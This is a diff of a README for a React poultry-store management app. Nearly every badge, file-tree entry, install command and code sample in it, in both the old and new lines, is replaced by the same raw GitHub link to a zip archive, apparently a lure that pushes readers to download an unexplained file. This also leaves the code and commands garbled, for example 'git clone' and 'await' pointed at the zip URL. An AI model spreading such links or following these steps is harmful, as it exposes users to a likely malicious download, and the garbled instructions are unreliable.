@@ -2,11 +2,11 @@
 
 A comprehensive React-based web application designed to manage all aspects of a poultry business, including inventory management, employee administration, sales tracking, supplier management, and detailed reporting.
 
-![React](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip)
-![Vite](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip)
-![TailwindCSS](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip)
-![DaisyUI](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip)
-![License](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip)
+![React](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip)
+![Vite](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip)
+![TailwindCSS](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip)
+![DaisyUI](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip)
+![License](https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip)
 
 ## 📋 Table of Contents
 
@@ -96,75 +96,75 @@ A comprehensive React-based web application designed to manage all aspects of a 
 Frontend/
 ├── public/                     # Static assets
 │   ├── assets/                # Product images and media
-│   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Vite logo
+│   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Vite logo
 ├── src/
 │   ├── components/            # Reusable components
 │   │   ├── ui/               # UI components
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # Form input with validation
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip        # Dashboard metric display
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # Inventory stock display
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip             # Notification component
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip    # Toast management
-│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip      # Toast context provider
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # Form input with validation
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip        # Dashboard metric display
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # Inventory stock display
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip             # Notification component
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip    # Toast management
+│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip      # Toast context provider
 │   │   ├── layout/           # Layout components
-│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip       # Main admin layout
+│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip       # Main admin layout
 │   │   ├── common/           # Common components
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip     # Error handling
-│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip    # Route protection
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip               # Top navigation
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Side navigation
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # Sales chart component
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip     # Error handling
+│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip    # Route protection
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip               # Top navigation
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Side navigation
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # Sales chart component
 │   ├── hooks/                # Custom React hooks
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip               # API data fetching
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Authentication state
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Form management
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip             # Toast notifications
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip               # API data fetching
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Authentication state
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Form management
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip             # Toast notifications
 │   ├── pages/                # Page components
 │   │   ├── admin/            # Admin dashboard pages
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # Main dashboard
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip          # Employee management
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # Product inventory
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip             # Sales management
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip           # Analytics & reports
-│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip          # Supplier management
-│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip       # Store configuration
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip            # User login
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip           # User registration
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip          # API testing (dev only)
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # Main dashboard
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip          # Employee management
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # Product inventory
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip             # Sales management
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip           # Analytics & reports
+│   │   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip          # Supplier management
+│   │   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip       # Store configuration
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip            # User login
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip           # User registration
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip          # API testing (dev only)
 │   ├── services/             # API service layer
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip                   # Base API service
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip           # Authentication APIs
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip      # Inventory APIs
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip       # Employee APIs
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip          # Sales APIs
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip        # Reports APIs
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip                   # Base API service
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip           # Authentication APIs
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip      # Inventory APIs
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip       # Employee APIs
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip          # Sales APIs
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip        # Reports APIs
 │   ├── utils/                # Utility functions
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip            # Form validation
-│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip        # API testing utilities
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Development tools
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip            # Form validation
+│   │   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip        # API testing utilities
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Development tools
 │   ├── constants/            # App constants
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Mock data for development
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Mock data for development
 │   ├── config/               # Configuration
-│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip           # Environment variables
-│   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip               # Main app component
-│   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # App entry point
-│   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip             # Global styles
+│   │   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip           # Environment variables
+│   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip               # Main app component
+│   ├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # App entry point
+│   └── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip             # Global styles
 ├── .env                      # Environment variables
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip              # Environment template
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip              # Environment template
 ├── .gitignore               # Git ignore rules
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip             # Dependencies and scripts
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip           # Vite configuration
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip       # Tailwind CSS configuration
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip        # PostCSS configuration
-├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip         # ESLint configuration
-└── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip                # Project documentation
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip             # Dependencies and scripts
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip           # Vite configuration
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip       # Tailwind CSS configuration
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip        # PostCSS configuration
+├── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip         # ESLint configuration
+└── https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip                # Project documentation
 ```
 
 ## 🚀 Installation
 
 ### Prerequisites
 
-- **https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip** 18.0 or higher
+- **https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip** 18.0 or higher
 - **npm** 9.0 or higher (or **yarn** 1.22+)
 - **Git** for version control
 
@@ -173,7 +173,7 @@ Frontend/
 1. **Clone the Repository**
 
    ```bash
-   git clone https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip
+   git clone https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip
    cd poultry-store-management/Frontend
    ```
 
@@ -189,7 +189,7 @@ Frontend/
 
    ```bash
    # Copy environment template
-   cp https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip .env
+   cp https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip .env
 
    # Edit environment variables
    nano .env  # or use your preferred editor
@@ -234,7 +234,7 @@ VITE_REFRESH_THRESHOLD=300000
 
 ### Build Configuration
 
-The project uses **Vite** for building. Configuration is in `https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip`:
+The project uses **Vite** for building. Configuration is in `https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip`:
 
 ```javascript
 export default defineConfig({
@@ -312,7 +312,7 @@ import { employeeService } from "./services/employeeService";
 // Login Example
 const handleLogin = async (credentials) => {
   try {
-    const response = await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip(credentials);
+    const response = await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip(credentials);
     // Handle successful login
   } catch (error) {
     // Handle login error
@@ -325,7 +325,7 @@ const handleLogin = async (credentials) => {
 ```javascript
 // Using Custom Hook
 const Dashboard = () => {
-  const { data, loading, error } = useApi(https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip);
+  const { data, loading, error } = useApi(https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip);
 
   if (loading) return <LoadingSpinner />;
   if (error) return <ErrorMessage error={error} />;
@@ -382,10 +382,10 @@ The application includes a built-in API testing dashboard:
 
 ```javascript
 // Console Testing Examples
-await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip(); // Test backend connection
-await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip(); // Test authentication
-await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip(); // Test products endpoint
-await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip(); // Run all tests
+await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip(); // Test backend connection
+await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip(); // Test authentication
+await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip(); // Test products endpoint
+await https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip(); // Run all tests
 ```
 
 ### Manual Testing Checklist
@@ -481,7 +481,7 @@ npx serve -s dist -l 3000
 ### Environment Variables for Production
 
 ```env
-https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip
+https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip
 VITE_APP_NAME=Poultry Store Management
 VITE_ENABLE_DEBUG=false
 ```
@@ -496,7 +496,7 @@ We welcome contributions! Please follow these steps:
 2. **Clone Your Fork**
 
    ```bash
-   git clone https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip
+   git clone https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip
    ```
 
 3. **Create Feature Branch**
@@ -555,11 +555,11 @@ echo $VITE_API_BASE_URL
 
 ```bash
 # Clear node_modules and reinstall
-rm -rf node_modules https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip
+rm -rf node_modules https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip
 npm install
 
 # Clear Vite cache
-rm -rf https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip
+rm -rf https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip
 ```
 
 #### 3. **Authentication Issues**
@@ -581,7 +581,7 @@ npx tailwindcss --help
 
 ### Performance Optimization
 
-- **Code Splitting**: Use https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/services/Software_2.5.zip() for large components
+- **Code Splitting**: Use https://github.com/oliverquaye23/Frontend/raw/refs/heads/main/src/context/Software_v3.2.zip() for large components
 - **Image Optimization**: Compress product images
 - **Bundle Analysis**: Use `npm run build:analyze`
 - **Caching**: Implement service worker for offline support
